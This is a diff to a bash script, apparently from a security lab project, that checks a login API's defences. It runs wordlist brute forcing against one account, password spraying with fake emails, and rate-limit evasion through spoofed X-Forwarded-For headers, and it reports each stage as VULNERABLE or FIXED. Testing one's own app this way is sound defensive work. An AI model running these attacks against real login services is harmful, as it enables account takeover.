@@ -62,13 +62,13 @@ echo "Target:   $TARGET_EMAIL" | tee -a "$OUT_FILE"
 echo "Wordlist: $WORDLIST" | tee -a "$OUT_FILE"
 echo | tee -a "$OUT_FILE"
 
-LAST_BODY=""
-
+# attempt() scrie log-ul in stderr si returneaza DOAR codul HTTP in stdout
+# Astfel captura code="$(attempt ...)" prinde exact codul numeric, nu tot output-ul.
 attempt() {
   local label="$1"
   local email="$2"
   local pass="$3"
-  local xff="${4:-}" # optional
+  local xff="${4:-}"
 
   local args=(
     -s -i -X POST "$LOGIN_URL"
@@ -83,15 +83,43 @@ attempt() {
   local res code body
   res="$(curl "${args[@]}")"
 
-  # HTTP/1.1 401 Unauthorized -> 401
   code="$(echo "$res" | awk 'NR==1{print $2}')"
-
-  # body (linie goala separa headerele de body)
   body="$(echo "$res" | awk 'BEGIN{h=1} h && /^\r?$/{h=0; next} !h' | tr -d '\n' | cut -c1-200)"
-  LAST_BODY="$body"
 
-  printf "%-44s -> HTTP %s | %s\n" "$label" "$code" "$body" | tee -a "$OUT_FILE"
+  # log merge in stderr (nu polueaza stdout-ul capturat cu $())
+  printf "%-44s -> HTTP %s | %s\n" "$label" "$code" "$body" | tee -a "$OUT_FILE" >&2
+
+  # stdout returneaza DOAR codul HTTP — acesta e capturat de apelant
   echo "$code"
+}
+
+# Functie ajutatoare: returneaza body-ul ultimului raspuns
+attempt_body() {
+  local label="$1"
+  local email="$2"
+  local pass="$3"
+  local xff="${4:-}"
+
+  local args=(
+    -s -i -X POST "$LOGIN_URL"
+    -H "Content-Type: application/json"
+    -d "{\"email\":\"$email\",\"password\":\"$pass\"}"
+  )
+
+  if [ -n "$xff" ]; then
+    args+=(-H "X-Forwarded-For: $xff")
+  fi
+
+  local res code body
+  res="$(curl "${args[@]}")"
+
+  code="$(echo "$res" | awk 'NR==1{print $2}')"
+  body="$(echo "$res" | awk 'BEGIN{h=1} h && /^\r?$/{h=0; next} !h' | tr -d '\n' | cut -c1-200)"
+
+  printf "%-44s -> HTTP %s | %s\n" "$label" "$code" "$body" | tee -a "$OUT_FILE" >&2
+
+  # returneaza "CODE|BODY" — apelantul face IFS='|' read
+  echo "${code}|${body}"
 }
 
 # ------------------------
@@ -106,13 +134,15 @@ STAGE_A_RESULT="VULNERABLE"
 a_i=0
 
 while IFS= read -r PASS; do
-  # skip empty / comments
   if [ -z "${PASS// /}" ] || [[ "$PASS" == \#* ]]; then
     continue
   fi
 
   a_i=$((a_i+1))
-  code="$(attempt "A$a_i try pass='$PASS'" "$TARGET_EMAIL" "$PASS")"
+
+  local_result="$(attempt_body "A$a_i try pass='$PASS'" "$TARGET_EMAIL" "$PASS" "10.0.0.1")"
+  code="${local_result%%|*}"
+  body="${local_result#*|}"
 
   if [ "$code" = "200" ]; then
     echo "[OK] Stage A: parola corecta gasita: $PASS" | tee -a "$OUT_FILE"
@@ -120,21 +150,18 @@ while IFS= read -r PASS; do
     exit 0
   fi
 
-  # rate limiting
   if [ "$code" = "429" ]; then
     STAGE_A_RESULT="FIXED (rate limit HTTP 429 dupa $a_i incercari)"
     break
   fi
 
-  # lockout detect (daca serverul returneaza mesaj diferit; daca nu, verifica DB separat)
-  if echo "$LAST_BODY" | grep -iq "locked\|blocat\|temporarily locked"; then
+  if echo "$body" | grep -iq "locked\|blocat\|temporarily locked"; then
     STAGE_A_RESULT="FIXED (account lockout observat in raspuns dupa $a_i incercari)"
     break
   fi
 
   sleep 0.05
 
-  # limitam ca sa nu dureze mult
   if [ "$a_i" -ge 25 ]; then
     echo "[INFO] Stage A: limita 25 incercari atinsa." | tee -a "$OUT_FILE"
     break
@@ -143,6 +170,9 @@ done < "$WORDLIST"
 
 echo "[RESULT Stage A] $STAGE_A_RESULT" | tee -a "$OUT_FILE"
 echo | tee -a "$OUT_FILE"
+
+# UNLOCK — reseteaza contul inainte de Stage B
+"$(dirname "$0")/4.3_unlock_acc.sh" "$TARGET_EMAIL" "$(dirname "$0")/../backend/db/Break-the-Login.db"
 
 # ------------------------
 # Stage B: spray (email-uri diferite)
@@ -157,7 +187,9 @@ TS="$(date +%s)"
 
 for i in $(seq 1 50); do
   e="spray_${TS}_${i}@attacker.test"
-  code="$(attempt "B$i spray email=$e" "$e" "WrongSpray_${i}!")"
+    
+  # folosim attempt() simplu — returneaza doar codul
+  code="$(attempt "B$i spray email=$e" "$e" "WrongSpray_${i}!" "10.0.0.2")"
 
   if [ "$code" = "429" ]; then
     STAGE_B_RESULT="FIXED (rate limit per IP dupa $i cereri)"
@@ -182,14 +214,17 @@ STAGE_C_RESULT="VULNERABLE"
 
 for i in $(seq 1 15); do
   FAKE_IP="$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))"
-  code="$(attempt "C$i spoofed IP=$FAKE_IP" "$TARGET_EMAIL" "WrongPass_spoof_${i}!" "$FAKE_IP")"
 
-  # daca serverul raspunde 429 chiar si cu IP-uri diferite
+  #folosim attempt_body ca sa avem si body-ul pentru detectia lockout
+  local_result="$(attempt_body "C$i spoofed IP=$FAKE_IP" "$TARGET_EMAIL" "WrongPass_spoof_${i}!" "$FAKE_IP")"
+  code="${local_result%%|*}"
+  body="${local_result#*|}"
+
   if [ "$code" = "429" ]; then
     echo "[INFO] Stage C: rate limit (HTTP 429) chiar si cu IP rotation." | tee -a "$OUT_FILE"
   fi
 
-  if echo "$LAST_BODY" | grep -iq "locked\|blocat\|temporarily locked"; then
+  if echo "$body" | grep -iq "locked\|blocat\|temporarily locked"; then
     STAGE_C_RESULT="FIXED (lockout per cont observat in raspuns dupa $i incercari cu IP-uri diferite)"
     break
   fi
